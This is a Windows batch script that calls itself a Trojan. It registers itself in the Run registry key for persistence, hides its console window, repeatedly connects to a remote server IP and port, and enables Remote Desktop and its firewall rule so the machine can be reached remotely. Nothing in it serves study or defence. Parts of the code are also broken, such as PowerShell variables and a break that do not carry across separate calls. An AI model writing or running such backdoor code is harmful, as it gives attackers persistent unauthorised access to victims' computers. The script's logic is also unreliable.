@echo off
setlocal

REM === CONFIGURATION ===
set SERVER_IP=192.168.0.100  REM Replace with your desired IP address
set SERVER_PORT=1234       REM Replace with your desired port

REM === MAIN CODE ===
REM Create a registry key to run the Trojan on system startup
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "MyTrojan" /t REG_SZ /d "%~dp0%~nx0" /f

REM Hide the Trojan window
powershell -WindowStyle Hidden -Command "Add-Type -Name Window -Namespace Console -MemberDefinition '[DllImport(\"Kernel32.dll\")] public static extern IntPtr GetConsoleWindow(); [DllImport(\"user32.dll\")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'"
powershell -WindowStyle Hidden -Command "[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)"

REM Start the loop to establish a connection with the remote server
:loop
  REM Check if the server is available and attempt to connect
  powershell -Command "$client = New-Object System.Net.Sockets.TcpClient; $client.Connect('%SERVER_IP%', %SERVER_PORT%); if ($client.Connected) { break; } else { Start-Sleep -Seconds 5; }"

REM Once connected, enable Remote Desktop and execute the connection
powershell -Command "Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0"
powershell -Command "Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'"

REM Open the Remote Desktop connection to the server
mstsc /v:%SERVER_IP%

REM Close the connection and re-attempt if it fails
powershell -Command "$client.Close(); Start-Sleep -Seconds 5;"

goto loop
